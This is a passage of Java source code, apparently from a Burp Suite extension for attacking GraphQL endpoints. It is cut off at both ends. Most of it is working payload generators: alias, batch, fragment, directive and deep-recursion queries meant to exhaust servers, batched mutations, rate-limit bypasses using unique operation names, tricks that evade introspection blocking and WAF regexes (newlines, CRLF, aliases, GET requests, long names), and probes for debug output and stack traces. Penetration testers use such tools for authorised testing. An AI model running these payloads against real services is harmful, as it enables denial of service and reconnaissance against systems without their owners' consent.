            BorderFactory.createEmptyBorder(GripTheme.SPACING_SM, GripTheme.SPACING_MD, GripTheme.SPACING_SM, GripTheme.SPACING_MD)
        ));
        btn.addActionListener(action);
        panel.add(btn);
    }

    private void extractFieldFromQuery(String query) {
        if (query == null || query.isEmpty()) {
            extractedFieldName = "__typename";
            extractedFieldCall = null;
            extractedMutationName = null;
            return;
        }

        Pattern opTypePattern = Pattern.compile("^\\s*(query|mutation|subscription)", Pattern.CASE_INSENSITIVE);
        Matcher opMatcher = opTypePattern.matcher(query);
        if (opMatcher.find()) {
            extractedOperationType = opMatcher.group(1).toLowerCase();
        } else {
            extractedOperationType = "query";
        }

        Pattern fieldPattern = Pattern.compile(
            "(?:query|mutation|subscription)\\s*(?:\\w+)?\\s*(?:\\([^)]*\\))?\\s*\\{\\s*(\\w+)",
            Pattern.CASE_INSENSITIVE
        );
        Matcher matcher = fieldPattern.matcher(query);
        if (matcher.find()) {
            extractedFieldName = matcher.group(1);
            if (extractedOperationType.equals("mutation")) {
                extractedMutationName = extractedFieldName;
            }
        } else {
            Pattern simplePattern = Pattern.compile("\\{\\s*(\\w+)");
            Matcher simpleMatcher = simplePattern.matcher(query);
            if (simpleMatcher.find()) {
                extractedFieldName = simpleMatcher.group(1);
            }
        }

        extractedFieldCall = extractFullFieldCall(query);
    }

    private String extractFullFieldCall(String query) {
        if (query == null) return null;

        int firstBrace = query.indexOf('{');
        if (firstBrace == -1) return null;

        int depth = 0;
        int start = -1;
        int end = -1;

        for (int i = firstBrace; i < query.length(); i++) {
            char c = query.charAt(i);
            if (c == '{') {
                depth++;
                if (depth == 1) {
                    start = i + 1;
                }
            } else if (c == '}') {
                depth--;
                if (depth == 0) {
                    end = i;
                    break;
                }
            }
        }

        if (start != -1 && end != -1 && end > start) {
            return query.substring(start, end).trim();
        }
        return null;
    }

    private void setQueryOutput(JsonObject body, String status) {
        queryArea.setText(PRETTY_GSON.toJson(body));
        statusLabel.setText(status);
    }

    private void setQueryOutputRaw(String content, String status) {
        queryArea.setText(content);
        statusLabel.setText(status);
    }

    private void applyAliasOverloading() {
        currentAttackMode = "query";
        String fieldToUse = extractedFieldCall != null ? extractedFieldCall : extractedFieldName;

        StringBuilder sb = new StringBuilder();
        sb.append(extractedOperationType).append(" GripAliasOverload {\n");
        for (int i = 0; i < aliasCount; i++) {
            sb.append(String.format("  a%d: %s\n", i, fieldToUse));
        }
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Alias Overloading: " + aliasCount + " aliases");
    }

    private void applyBatchQuery() {
        currentAttackMode = "batch";

        if (originalQuery == null) {
            statusLabel.setText("No query loaded - load a request first");
            return;
        }

        JsonArray batch = new JsonArray();
        for (int i = 0; i < batchCount; i++) {
            JsonObject item = new JsonObject();
            item.addProperty("query", originalQuery);
            batch.add(item);
        }

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Batch Query: " + batchCount + " copies of original query");
    }

    private void applyMixedBatch() {
        currentAttackMode = "batch";

        String query = originalQuery != null ? originalQuery : "query { __typename }";
        String introQuery = "query { __schema { queryType { name } } }";

        JsonArray batch = new JsonArray();

        for (int i = 0; i < batchCount; i++) {
            JsonObject item = new JsonObject();

            item.addProperty("query", i % 2 == 0 ? query : introQuery);
            batch.add(item);
        }

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Mixed Batch: " + batchCount + " alternating queries + introspection");
    }

    private void applyIncrementalBatch() {
        currentAttackMode = "batch";

        String query = originalQuery != null ? originalQuery : "query { __typename }";

        JsonArray batch = new JsonArray();
        for (int i = 0; i < batchCount; i++) {
            JsonObject item = new JsonObject();
            item.addProperty("query", query);
            item.addProperty("operationName", "Op" + i);
            batch.add(item);
        }

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Incremental Batch: " + batchCount + " queries - adjust Batch spinner and retry to find server limit");
    }

    private void applyBatchWithVariables() {
        currentAttackMode = "batch";

        String baseQuery = originalQuery != null ? originalQuery : "query { __typename }";

        JsonArray batch = new JsonArray();
        for (int i = 0; i < batchCount; i++) {
            JsonObject item = new JsonObject();
            item.addProperty("query", baseQuery);
            item.addProperty("operationName", "GripBatch" + i);
            batch.add(item);
        }

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Batch with Variables: " + batchCount + " queries - each has unique operationName (bypasses some rate limits)");
    }

    private void applyFieldDuplication() {
        currentAttackMode = "query";

        String fieldToUse = extractedFieldName != null ? extractedFieldName : "__typename";

        StringBuilder sb = new StringBuilder();
        sb.append(extractedOperationType).append(" GripFieldDuplication {\n");
        for (int i = 0; i < fieldDupCount; i++) {
            sb.append("  f").append(i).append(": ").append(fieldToUse).append("\n");
        }
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Field Duplication: " + fieldDupCount + " aliased fields (each alias = separate resolution)");
    }

    private void applyWidthAttack() {
        currentAttackMode = "query";

        StringBuilder sb = new StringBuilder();
        sb.append("query GripWidthAttack {\n");

        String[] commonTypes = {"Query", "Mutation", "Subscription", "User", "Admin", "String", "Int", "Boolean", "ID", "Float"};
        for (int i = 0; i < Math.min(aliasCount, commonTypes.length); i++) {
            sb.append("  t").append(i).append(": __type(name: \"").append(commonTypes[i % commonTypes.length]).append("\") { name kind fields { name type { name } } }\n");
        }

        for (int i = commonTypes.length; i < aliasCount; i++) {
            sb.append("  t").append(i).append(": __type(name: \"Type").append(i).append("\") { name kind }\n");
        }

        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Width Attack: " + aliasCount + " DIFFERENT __type queries (breadth test, not repetition)");
    }

    private void applyFragmentOverloading() {
        currentAttackMode = "query";
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < fragmentCount; i++) {
            sb.append("fragment f").append(i).append(" on __Schema { queryType { name } }\n");
        }

        sb.append("\nquery GripFragmentOverload {\n  __schema {\n");
        for (int i = 0; i < fragmentCount; i++) {
            sb.append("    ...f").append(i).append("\n");
        }
        sb.append("  }\n}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Fragment Overloading: " + fragmentCount + " fragments");
    }

    private void applyDeepRecursion() {
        currentAttackMode = "query";
        StringBuilder sb = new StringBuilder();
        sb.append("query GripDeepRecursion {\n");
        sb.append("  __schema {\n");
        sb.append("    queryType {\n");
        sb.append("      name\n");

        String indent = "      ";
        for (int i = 0; i < depthCount; i++) {
            sb.append(indent).append("fields {\n");
            sb.append(indent).append("  name\n");
            sb.append(indent).append("  type {\n");
            sb.append(indent).append("    name\n");
            indent += "    ";
        }

        for (int i = 0; i < depthCount; i++) {
            indent = indent.substring(0, indent.length() - 4);
            sb.append(indent).append("  }\n");
            sb.append(indent).append("}\n");
        }

        sb.append("    }\n");
        sb.append("  }\n");
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Deep Recursion: depth " + depthCount);
    }

    private void applyCircularIntrospection() {
        currentAttackMode = "query";
        StringBuilder sb = new StringBuilder();
        sb.append("query GripCircularIntrospection {\n");
        sb.append("  __schema {\n");
        sb.append("    types {\n");
        sb.append("      name\n");
        sb.append("      kind\n");

        String indent = "      ";
        for (int i = 0; i < depthCount; i++) {
            sb.append(indent).append("fields {\n");
            sb.append(indent).append("  name\n");
            sb.append(indent).append("  type {\n");
            sb.append(indent).append("    name\n");
            sb.append(indent).append("    kind\n");
            sb.append(indent).append("    ofType {\n");
            sb.append(indent).append("      name\n");
            indent += "      ";
        }

        for (int i = 0; i < depthCount; i++) {
            indent = indent.substring(0, indent.length() - 6);
            sb.append(indent).append("    }\n");
            sb.append(indent).append("  }\n");
            sb.append(indent).append("}\n");
        }

        sb.append("    }\n");
        sb.append("  }\n");
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Circular Introspection: depth " + depthCount);
    }

    private void applyAliasedMutations() {
        currentAttackMode = "query";

        String fieldCall;
        if (extractedOperationType.equals("mutation") && extractedFieldCall != null) {

            fieldCall = extractedFieldCall;
        } else if (extractedMutationName != null) {

            fieldCall = extractedMutationName + " { __typename }";
        } else {

            fieldCall = "__typename  # REPLACE with actual mutation like: createUser(input: {}) { id }";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("mutation GripAliasedMutations {\n");
        for (int i = 0; i < aliasCount; i++) {
            sb.append("  m").append(i).append(": ").append(fieldCall).append("\n");
        }
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());

        String status = extractedOperationType.equals("mutation")
            ? "Aliased Mutations: " + aliasCount + " copies of your mutation (⚠ Review!)"
            : "Aliased Mutations: " + aliasCount + " (⚠ PLACEHOLDER - replace with real mutation!)";
        setQueryOutput(body, status);
    }

    private void applyBatchMutations() {
        currentAttackMode = "batch";

        String mutation = originalQuery != null && extractedOperationType.equals("mutation")
            ? originalQuery
            : "mutation { __typename }";

        JsonArray batch = new JsonArray();
        for (int i = 0; i < batchCount; i++) {
            JsonObject item = new JsonObject();
            item.addProperty("query", mutation);
            batch.add(item);
        }

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Batch Mutations: " + batchCount + " (⚠ Review before sending!)");
    }

    private void applyMixedMutationBatch() {
        currentAttackMode = "batch";

        boolean hasMutation = extractedOperationType.equals("mutation") && originalQuery != null;

        JsonArray batch = new JsonArray();

        if (hasMutation) {

            for (int i = 0; i < batchCount; i++) {
                JsonObject item = new JsonObject();
                item.addProperty("query", i % 2 == 0 ? originalQuery : "query { __typename }");
                batch.add(item);
            }
            queryArea.setText(PRETTY_GSON.toJson(batch));
            statusLabel.setText("Mixed Batch: " + batchCount + " items - mutation + queries interleaved (⚠ Review!)");
        } else {

            for (int i = 0; i < batchCount; i++) {
                JsonObject item = new JsonObject();
                if (i % 2 == 0) {
                    item.addProperty("query", "mutation { __typename }  # REPLACE with real mutation");
                } else {
                    item.addProperty("query", originalQuery != null ? originalQuery : "query { __typename }");
                }
                batch.add(item);
            }
            queryArea.setText(PRETTY_GSON.toJson(batch));
            statusLabel.setText("Mixed Batch: PLACEHOLDER - load a mutation request first or edit manually");
        }
    }

    private void applyMutationFragments() {
        currentAttackMode = "query";

        StringBuilder sb = new StringBuilder();

        String mutationType = extractedOperationType.equals("mutation") ? "Mutation" : "Mutation";

        for (int i = 0; i < fragmentCount; i++) {
            sb.append("fragment MF").append(i).append(" on ").append(mutationType).append(" { __typename }\n");
        }

        sb.append("\nmutation GripMutationFragments {\n");
        for (int i = 0; i < fragmentCount; i++) {
            sb.append("  ...MF").append(i).append("\n");
        }
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Mutation Fragments: " + fragmentCount + " unique fragments (each = separate resolution)");
    }

    private void applyDepthProbe(int depth) {
        currentAttackMode = "query";
        StringBuilder sb = new StringBuilder();
        sb.append("query GripDepthProbe").append(depth).append(" {\n");

        String indent = "  ";
        sb.append(indent).append("__schema {\n");
        indent += "  ";

        for (int i = 0; i < depth; i++) {
            sb.append(indent).append("types {\n");
            indent += "  ";
            sb.append(indent).append("name\n");
            sb.append(indent).append("fields {\n");
            indent += "  ";
            sb.append(indent).append("name\n");
            sb.append(indent).append("type {\n");
            indent += "  ";
        }

        sb.append(indent).append("name\n");

        for (int i = 0; i < depth; i++) {
            indent = indent.substring(2);
            sb.append(indent).append("}\n");
            indent = indent.substring(2);
            sb.append(indent).append("}\n");
            indent = indent.substring(2);
            sb.append(indent).append("}\n");
        }

        indent = indent.substring(2);
        sb.append(indent).append("}\n");
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Depth Probe: " + depth + " levels - check if server rejects");
    }

    private void applyWidthProbe(int width) {
        currentAttackMode = "query";
        StringBuilder sb = new StringBuilder();
        sb.append("query GripWidthProbe").append(width).append(" {\n");

        for (int i = 0; i < width; i++) {
            sb.append("  a").append(i).append(": __typename\n");
        }
        sb.append("}");

        JsonObject body = new JsonObject();
        body.addProperty("query", sb.toString());
        setQueryOutput(body, "Width Probe: " + width + " aliases - check if server rejects");
    }

    private void applyBatchProbe(int size) {
        currentAttackMode = "batch";

        JsonArray batch = new JsonArray();
        for (int i = 0; i < size; i++) {
            JsonObject item = new JsonObject();
            item.addProperty("query", "query { __typename }");
            batch.add(item);
        }

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Batch Probe: " + size + " queries - check if server rejects");
    }

    private void applyDirectiveOverloading(String directive) {
        currentAttackMode = "query";

        StringBuilder directives = new StringBuilder();
        for (int i = 0; i < directiveCount; i++) {
            if (directive.equals("include")) {
                directives.append("@include(if: true) ");
            } else {
                directives.append("@skip(if: false) ");
            }
        }

        String fieldName = extractedFieldName != null ? extractedFieldName : "__typename";
        String query;

        if (extractedFieldCall != null && extractedFieldCall.contains("{")) {

            int braceIndex = extractedFieldCall.indexOf('{');
            String beforeBrace = extractedFieldCall.substring(0, braceIndex).trim();
            String afterBrace = extractedFieldCall.substring(braceIndex);
            query = extractedOperationType + " Grip" + directive.substring(0,1).toUpperCase() +
                    directive.substring(1) + "Overload {\n  " + beforeBrace + " " + directives + afterBrace + "\n}";
        } else {

            query = extractedOperationType + " Grip" + directive.substring(0,1).toUpperCase() +
                    directive.substring(1) + "Overload {\n  " + fieldName + " " + directives + "\n}";
        }

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "@" + directive + " Overloading: " + directiveCount + " directives");
    }

    private void applyDeferTest() {
        currentAttackMode = "query";
        String query = "query GripDeferTest {\n  __schema {\n    queryType {\n      name\n    }\n    ... @defer {\n      types {\n        name\n      }\n    }\n  }\n}";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "@defer Test: Check if incremental delivery is supported");
    }

    private void applyStreamTest() {
        currentAttackMode = "query";
        String query = "query GripStreamTest {\n  __schema {\n    types @stream(initialCount: 1) {\n      name\n      kind\n    }\n  }\n}";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "@stream Test: Check if streaming is supported");
    }

    private void applyMixedDirectives() {
        currentAttackMode = "query";

        StringBuilder directives = new StringBuilder();
        for (int i = 0; i < directiveCount; i++) {
            if (i % 2 == 0) {
                directives.append("@include(if: true) ");
            } else {
                directives.append("@skip(if: false) ");
            }
        }

        String fieldName = extractedFieldName != null ? extractedFieldName : "__typename";
        String query;

        if (extractedFieldCall != null && extractedFieldCall.contains("{")) {

            int braceIndex = extractedFieldCall.indexOf('{');
            String beforeBrace = extractedFieldCall.substring(0, braceIndex).trim();
            String afterBrace = extractedFieldCall.substring(braceIndex);
            query = extractedOperationType + " GripMixedDirectives {\n  " + beforeBrace + " " + directives + afterBrace + "\n}";
        } else {

            query = extractedOperationType + " GripMixedDirectives {\n  " + fieldName + " " + directives + "\n}";
        }

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Mixed Directives: " + directiveCount + " alternating @include/@skip");
    }

    private void applyDirectiveDiscovery() {
        currentAttackMode = "query";
        String query = "query GripDirectiveDiscovery {\n  __schema {\n    directives {\n      name\n      description\n      locations\n      args {\n        name\n        type { name kind }\n        defaultValue\n      }\n    }\n  }\n}";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Directive Discovery: Lists all available directives");
    }

    private void applyLongOperationName() {
        currentAttackMode = "query";
        StringBuilder opName = new StringBuilder("GripLongName");
        for (int i = 0; i < 100; i++) {
            opName.append("AAAAAAAAAA");
        }

        String query = "query " + opName + " { __typename }";
        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Long Operation Name: 1000+ characters");
    }

    private void applySpecialCharsOperationName() {
        currentAttackMode = "query";

        String query = "query _______GripSpecial_____ { __typename }";
        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Special Chars: Underscores at edges");
    }

    private void applyUnicodeOperationName() {
        currentAttackMode = "query";

        String query = "query Grip\u00e9\u00e8\u00ea { __typename }";
        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Unicode Operation Name: éèê characters");
    }

    private void applyReservedWordsOperationName() {
        currentAttackMode = "query";
        String query = "query query { __typename }";
        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Reserved Words: 'query' as operation name");
    }

    private void applyFieldSuggestionProbe() {
        currentAttackMode = "query";

        String query = "query GripFieldProbe {\n" +
            "  usr { id }\n" +
            "  userr { id }\n" +
            "  getUser { id }\n" +
            "  currentUsr { id }\n" +
            "  me { id }\n" +
            "  viewer { id }\n" +
            "  accoun { id }\n" +
            "}";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Field Suggestion Probe: Typos to trigger 'Did you mean?' hints");
    }

    private void applyTypeEnumeration() {
        currentAttackMode = "query";
        String query = "query GripTypeEnum {\n" +
            "  user: __type(name: \"User\") { name fields { name } }\n" +
            "  account: __type(name: \"Account\") { name fields { name } }\n" +
            "  post: __type(name: \"Post\") { name fields { name } }\n" +
            "  order: __type(name: \"Order\") { name fields { name } }\n" +
            "  product: __type(name: \"Product\") { name fields { name } }\n" +
            "  admin: __type(name: \"Admin\") { name fields { name } }\n" +
            "  query: __type(name: \"Query\") { name fields { name } }\n" +
            "  mutation: __type(name: \"Mutation\") { name fields { name } }\n" +
            "}";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Type Enumeration: Query common type names");
    }

    private void applyFullIntrospection() {
        currentAttackMode = "query";
        String query = "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } isDeprecated deprecationReason } inputFields { name description type { kind name ofType { kind name ofType { kind name } } } defaultValue } interfaces { kind name ofType { kind name } } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { kind name } } directives { name description locations args { name description type { kind name ofType { kind name } } defaultValue } } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Full Introspection Query");
    }

    private void applyTracing() {
        currentAttackMode = "tracing";
        String query = originalQuery != null ? originalQuery : "query { __typename }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);

        JsonObject extensions = new JsonObject();
        extensions.addProperty("tracing", true);
        body.add("extensions", extensions);

        setQueryOutput(body, "Tracing enabled via extensions.tracing=true");
    }

    private void applyDebugMode() {
        currentAttackMode = "debug";
        String query = originalQuery != null ? originalQuery : "query { __typename }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);

        JsonObject extensions = new JsonObject();
        extensions.addProperty("debug", true);
        extensions.addProperty("verbose", true);
        extensions.addProperty("includeStackTrace", true);
        body.add("extensions", extensions);

        setQueryOutput(body, "Debug mode enabled via extensions");
    }

    private void applyIntrospectionBypass() {
        currentAttackMode = "query";
        String query = "query { __type(name: \"Query\") { name fields { name type { name kind ofType { name } } } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Introspection Bypass: Using __type instead of __schema");
    }

    private void applyTypenameProbe() {
        currentAttackMode = "query";
        String query = "query { __typename }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "__typename Probe: May reveal info even when introspection is blocked");
    }

    private void applyBypassNewline() {
        currentAttackMode = "query";
        String query = "query { __schema\n{ types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Newline Bypass: Regex patterns often match __schema{ without newlines");
    }

    private void applyBypassTab() {
        currentAttackMode = "query";
        String query = "query { __schema\t{ types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Tab Bypass: Tab character between __schema and brace");
    }

    private void applyBypassCRLF() {
        currentAttackMode = "query";
        String query = "query { __schema\r\n{ types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "CRLF Bypass: Windows-style line endings may bypass Unix regex");
    }

    private void applyBypassFragment() {
        currentAttackMode = "query";
        String query = "fragment SchemaFields on __Schema { types { name fields { name } } }\n" +
                       "query { __schema { ...SchemaFields } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Fragment Bypass: Using fragments to access __schema indirectly");
    }

    private void applyBypassInlineFragment() {
        currentAttackMode = "query";
        String query = "query { ... on Query { __schema { types { name } } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Inline Fragment Bypass: Wrapping in inline fragment");
    }

    private void applyBypassAlias() {
        currentAttackMode = "query";
        String query = "query { s: __schema { types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Aliased Bypass: Aliasing __schema may bypass string matching");
    }

    private void applyBypassBatch() {
        currentAttackMode = "batch";
        JsonArray batch = new JsonArray();

        JsonObject item1 = new JsonObject();
        item1.addProperty("query", "query { __typename }");
        batch.add(item1);

        JsonObject item2 = new JsonObject();
        item2.addProperty("query", "query { __schema { types { name } } }");
        batch.add(item2);

        queryArea.setText(PRETTY_GSON.toJson(batch));
        statusLabel.setText("Batch Bypass: Introspection hidden in batch array");
    }

    private void applyBypassIncludeDirective() {
        currentAttackMode = "query";
        String query = "query($v: Boolean! = true) { __schema @include(if: $v) { types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "@include Bypass: Directive may confuse static pattern matching");
    }

    private void applyBypassSkipDirective() {
        currentAttackMode = "query";
        String query = "query($v: Boolean! = false) { __schema @skip(if: $v) { types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "@skip Bypass: @skip(if:false) still executes the field");
    }

    private void applyBypassLongOpName() {
        currentAttackMode = "query";
        StringBuilder opName = new StringBuilder();
        for (int i = 0; i < 50; i++) {
            opName.append("AAAAAAAAAA");
        }
        String query = "query " + opName + " { __schema { types { name } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Long OpName Bypass: May exceed WAF pattern matching buffers");
    }

    private void applyBypassGetMethod() {
        currentAttackMode = "get";
        String query = "{ __schema { types { name } } }";
        queryArea.setText(query);
        statusLabel.setText("GET Method Bypass: WAF rules may only inspect POST bodies");
    }

    private void applyErrorTrigger() {
        currentAttackMode = "query";
        String query = "query { __nonExistentField__12345(invalidArg: 999) { alsoInvalid } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Error Trigger: Invalid query to expose error details");
    }

    private void applyFingerprint() {
        currentAttackMode = "query";
        String query = "query { __schema { description directives { name description locations args { name } } } }";

        JsonObject body = new JsonObject();
        body.addProperty("query", query);
        setQueryOutput(body, "Engine Fingerprint: Query directives and schema description");
    }

    private void convertToGet() {
        currentAttackMode = "get";
        String query = originalQuery != null ? originalQuery : "query { __typename }";

        String encoded = URLEncoder.encode(query, StandardCharsets.UTF_8);
        String preview = "GET /graphql?query=" + encoded;
        if (preview.length() > 500) {
            preview = preview.substring(0, 500) + "...(truncated)";
        }
        queryArea.setText(preview);
        statusLabel.setText("GET Mode: Query URL-encoded in ?query= parameter (edit raw query above)");
    }

    private void convertToUrlEncoded() {
        currentAttackMode = "urlencoded";
        String query = originalQuery != null ? originalQuery : "query { __typename }";

        String encoded = "query=" + URLEncoder.encode(query, StandardCharsets.UTF_8);
        queryArea.setText(encoded);
        statusLabel.setText("URL-Encoded: Content-Type: application/x-www-form-urlencoded");
    }

    private void convertToMultipart() {
        currentAttackMode = "multipart";
        String query = originalQuery != null ? originalQuery : "query { __typename }";

        String boundary = "----GripBoundary" + System.currentTimeMillis();
        String multipart = "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"query\"\r\n\r\n" +
                query + "\r\n--" + boundary + "--";
        queryArea.setText(multipart);
        statusLabel.setText("Multipart: Content-Type: multipart/form-data; boundary=" + boundary);
    }

    private void applyPersistedQueryHash() {
        currentAttackMode = "query";
        String query = originalQuery != null ? originalQuery : "query { __typename }";

        String hashHex;
        try {
            java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(query.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hashBytes) {
                hexString.append(String.format("%02x", b));
            }
            hashHex = hexString.toString();
        } catch (java.security.NoSuchAlgorithmException e) {
            hashHex = "0".repeat(64);
        }

        JsonObject body = new JsonObject();
        body.addProperty("query", query);

        JsonObject extensions = new JsonObject();
        JsonObject persistedQuery = new JsonObject();
        persistedQuery.addProperty("version", 1);
        persistedQuery.addProperty("sha256Hash", hashHex);
        extensions.add("persistedQuery", persistedQuery);
        body.add("extensions", extensions);

        setQueryOutput(body, "APQ: Real SHA256 hash - test if server accepts persisted queries");
    }

    private String extractQueryFromRequest(HttpRequest request) {
        if (request == null) return null;

        String body = request.bodyToString();
        if (body == null || body.isEmpty()) {
            String path = request.path();
            if (path.contains("query=")) {
                int start = path.indexOf("query=") + 6;
                int end = path.indexOf("&", start);
                if (end == -1) end = path.length();
                try {
                    return java.net.URLDecoder.decode(path.substring(start, end), StandardCharsets.UTF_8);
                } catch (Exception e) {
                    return path.substring(start, end);
                }
            }
            return null;
        }

        try {
            if (body.trim().startsWith("{")) {
                JsonObject json = JsonParser.parseString(body).getAsJsonObject();
                if (json.has("query")) {
                    return json.get("query").getAsString();
                }
            } else if (body.trim().startsWith("[")) {
                JsonArray arr = JsonParser.parseString(body).getAsJsonArray();
                if (arr.size() > 0 && arr.get(0).isJsonObject()) {
                    JsonObject first = arr.get(0).getAsJsonObject();
                    if (first.has("query")) {
                        return first.get("query").getAsString();
                    }
                }
            }
        } catch (Exception e) {
            if (body.contains("query=")) {
                int start = body.indexOf("query=") + 6;
                int end = body.indexOf("&", start);
                if (end == -1) end = body.length();
                try {
                    return java.net.URLDecoder.decode(body.substring(start, end), StandardCharsets.UTF_8);
                } catch (Exception ex) {
                    return body.substring(start, end);
                }
            }
        }
        return null;
    }

    private boolean isGraphQLRequest(HttpRequest request) {
        if (request == null) return false;

        String path = request.path().toLowerCase();
        if (path.contains("graphql")) return true;

        String contentType = request.headerValue("Content-Type");
        if (contentType != null && contentType.contains("application/json")) {
            String body = request.bodyToString();
            return body != null && body.contains("\"query\"");
        }

        return request.method().equalsIgnoreCase("GET") && path.contains("query=");
    }

    @Override
    public HttpRequest getRequest() {
        if (currentRequest == null) return null;

        String content = queryArea.getText();
        if (content == null || content.isEmpty()) {
            return currentRequest;
        }

        try {
            switch (currentAttackMode) {
                case "get":
                    String encodedQuery = URLEncoder.encode(content, StandardCharsets.UTF_8);
                    String basePath = currentRequest.path().split("\\?")[0];
                    return currentRequest
                            .withMethod("GET")
                            .withPath(basePath + "?query=" + encodedQuery)
                            .withRemovedHeader("Content-Type")
                            .withBody("");

                case "urlencoded":
                    String urlEncodedBody = "query=" + URLEncoder.encode(content, StandardCharsets.UTF_8);
                    return currentRequest
                            .withMethod("POST")
                            .withUpdatedHeader("Content-Type", "application/x-www-form-urlencoded")
                            .withBody(urlEncodedBody);

                case "multipart":
                    String boundary = "----GripBoundary" + System.currentTimeMillis();
                    String multipartBody = "--" + boundary + "\r\n" +
                            "Content-Disposition: form-data; name=\"query\"\r\n\r\n" +
                            content + "\r\n--" + boundary + "--\r\n";
                    return currentRequest
                            .withMethod("POST")
                            .withUpdatedHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
                            .withBody(multipartBody);

                case "batch":

                    try {
                        JsonParser.parseString(content);
                    } catch (Exception jsonEx) {
                        statusLabel.setText("ERROR: Invalid JSON in batch mode - " + jsonEx.getMessage());
                        return currentRequest;
                    }
                    return currentRequest
                            .withMethod("POST")
                            .withUpdatedHeader("Content-Type", "application/json")
                            .withBody(content);

                case "query":
                case "tracing":
                case "debug":
                default:

                    return currentRequest
                            .withMethod("POST")
                            .withUpdatedHeader("Content-Type", "application/json")
                            .withBody(content);
            }
        } catch (Exception e) {
            return currentRequest;
        }
    }

    @Override
    public void setRequestResponse(HttpRequestResponse requestResponse) {
        if (requestResponse == null || requestResponse.request() == null) {
            currentRequest = null;
            originalQuery = null;
            originalRequestBody = null;
            queryArea.setText("No request loaded");
            return;
        }

        currentRequest = requestResponse.request();
        originalRequestBody = currentRequest.bodyToString();
        originalQuery = extractQueryFromRequest(currentRequest);
        currentAttackMode = "query";

        extractFieldFromQuery(originalQuery);

        if (originalRequestBody != null && !originalRequestBody.isEmpty()) {
            try {
                JsonObject parsed = JsonParser.parseString(originalRequestBody).getAsJsonObject();
                queryArea.setText(PRETTY_GSON.toJson(parsed));
            } catch (Exception e) {
                queryArea.setText(originalRequestBody);
            }
            statusLabel.setText("Loaded. Field: '" + extractedFieldName + "'. Select attack pattern.");
        } else if (originalQuery != null) {
            JsonObject body = new JsonObject();
            body.addProperty("query", originalQuery);
            queryArea.setText(PRETTY_GSON.toJson(body));
            statusLabel.setText("Loaded. Field: '" + extractedFieldName + "'. Select attack pattern.");
        } else {
            JsonObject defaultBody = new JsonObject();
            defaultBody.addProperty("query", "query { __typename }");
            queryArea.setText(PRETTY_GSON.toJson(defaultBody));
            statusLabel.setText("No query found - using default");
        }
    }

    @Override
    public boolean isEnabledFor(HttpRequestResponse requestResponse) {
        return requestResponse != null &&
               requestResponse.request() != null &&
               isGraphQLRequest(requestResponse.request());
    }

    @Override
